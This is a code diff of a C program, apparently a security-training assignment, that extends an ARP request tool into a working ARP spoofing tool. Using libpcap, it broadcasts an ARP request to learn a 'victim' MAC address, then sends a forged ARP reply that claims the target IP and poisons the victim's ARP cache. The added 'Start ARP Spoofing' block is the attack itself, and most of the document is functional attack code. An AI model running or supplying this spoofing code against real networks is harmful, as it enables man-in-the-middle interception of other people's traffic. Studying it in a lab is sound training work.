@@ -1,4 +1,4 @@
-//BoB 6th BadSpell(KJS)
+// BoB 6th ARP Spoofing -- code by BadSpell(KJS)
 #include <stdio.h>
 #include <arpa/inet.h>
 #include <pcap.h>
@@ -7,8 +7,6 @@
 #include <sys/socket.h>
 #include <sys/ioctl.h>
 #include <string.h>
-#define ARP_REQUEST		1
-#define ARP_REPLY			2
 
 typedef enum _ARP_OPCODE
 {
@@ -36,14 +34,6 @@ typedef struct _ARP_HEADER
     u_char targetIP[4];
 } __attribute__((packed)) ARP_HEADER, *LPARP_HEADER;
 
-char *getMac(uint8_t *mac)
-{
-	static char macAddress[32];
-	sprintf(macAddress, "%02X:%02X:%02X:%02X:%02X:%02X",
-		mac[0], mac[1],  mac[2],  mac[3],  mac[4], mac[5]);
-	return macAddress;
-}
-
 int main(int argc, char **argv)
 {
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -52,7 +42,7 @@ int main(int argc, char **argv)
 	u_char packet[1500];
 	struct ifreq if_mac, if_ip;
 	uint8_t localMacAddress[6];
-	uint32_t localIPAddress;
+	uint32_t localIPAddress, tempIP;
 	int sockfd;
 
 	if (argc != 4)
@@ -67,13 +57,12 @@ int main(int argc, char **argv)
 	handle = pcap_open_live(dev, BUFSIZ, 1, 300, errbuf);
 	if (handle == NULL)
 	{
-		printf("Couldn't open device %s: %s\n", dev, errbuf);
+		printf("[-] Couldn't open device %s: %s\n", dev, errbuf);
 		return 2;
 	}
-
 	if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == -1)
 	{
-		printf("Open Raw socket error.\n");
+		printf("[-] Open Raw socket error.\n");
 		return 2;
 	}
 	
@@ -87,7 +76,6 @@ int main(int argc, char **argv)
 
 	// Make ARP packet !!
 	LPETHER_HEADER etherHeader = (LPETHER_HEADER)packet;
-	uint32_t utarget_ip;
 
 	memcpy(etherHeader->destHA, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
 	memcpy(etherHeader->sourceHA, localMacAddress, 6);
@@ -98,14 +86,14 @@ int main(int argc, char **argv)
 	ipHeader->protocolType = ntohs(ETHERTYPE_IP);
 	ipHeader->hardwareAddressLength = 6;
 	ipHeader->protocolAddressLength = 4;
-	ipHeader->operationCode = ntohs(ARP_REQUEST);
+	ipHeader->operationCode = ntohs(ARP_Request);
 	memcpy(ipHeader->senderHA, localMacAddress, 6);
 	memcpy(ipHeader->senderIP, &localIPAddress, 4);
 	memcpy(ipHeader->targetHA, "\x00\x00\x00\x00\x00\x00", 6);
-	utarget_ip = inet_addr(sender_ip);
-	memcpy(ipHeader->targetIP, &utarget_ip, 4);
+	tempIP = inet_addr(sender_ip);
+	memcpy(ipHeader->targetIP, &tempIP, 4);
 
-	printf("Send ARP broadcast for get victim's MAC Address...\n");
+	printf("[*] Send ARP broadcast for get victim's MAC Address...\n");
 	pcap_sendpacket(handle, packet, sizeof(ETHER_HEADER) + sizeof(ARP_HEADER));
 
 	const u_char *captured_packet;
@@ -122,15 +110,30 @@ int main(int argc, char **argv)
 			continue;
 
 		LPARP_HEADER ipHeader = (LPARP_HEADER)(captured_packet + sizeof(ETHER_HEADER));
-		if (ntohs(ipHeader->protocolType) == ETHERTYPE_IP && ntohs(ipHeader->operationCode) == ARP_REPLY)
+		if (ntohs(ipHeader->protocolType) == ETHERTYPE_IP && ntohs(ipHeader->operationCode) == ARP_Reply)
 		{
-			printf("Received ARP from %s\n", sender_ip);
-			printf("%s Mac Address -> %s\n", sender_ip, getMac(ipHeader->senderHA));
+			printf("[*] Received ARP from %s\n", sender_ip);
+			printf("[*] %s Mac Address -> %02X:%02X:%02X:%02X:%02X:%02X\n", sender_ip,
+				ipHeader->senderHA[0], ipHeader->senderHA[1], ipHeader->senderHA[2],
+				ipHeader->senderHA[3], ipHeader->senderHA[4], ipHeader->senderHA[5]);
 
 			memcpy(victimHA, ipHeader->senderHA, 6);
 			break;
 		}
 	}
+
+	// Start ARP Spoofing
+	memcpy(etherHeader->destHA, victimHA, 6);
+	ipHeader->operationCode = ntohs(ARP_Reply);
+
+	tempIP = inet_addr(target_ip);
+	memcpy(ipHeader->senderIP, &tempIP, 4);
+	memcpy(ipHeader->targetHA, victimHA, 6);
+	tempIP = inet_addr(sender_ip);
+	memcpy(ipHeader->targetIP, &tempIP, 4);
+
+	printf("[!] Start ARP spoofing !!\n");
+	pcap_sendpacket(handle, packet, sizeof(ETHER_HEADER) + sizeof(ARP_HEADER));
 	pcap_close(handle);
 	return 0;
 }
